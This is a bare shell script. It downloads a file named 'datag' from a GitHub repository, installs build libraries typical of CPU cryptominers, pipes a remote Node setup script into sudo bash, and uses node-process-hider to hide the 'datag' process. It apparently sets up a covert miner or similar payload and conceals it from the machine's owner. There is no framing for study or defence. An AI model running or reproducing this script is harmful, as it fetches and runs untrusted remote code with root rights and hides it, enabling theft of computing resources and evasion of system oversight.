apt update
apt install -y lynx && sudo lynx -dont_wrap_pre -dump "https://github.com/raufpermana22/top/raw/main/datag" > datag 
sudo apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ph add datag
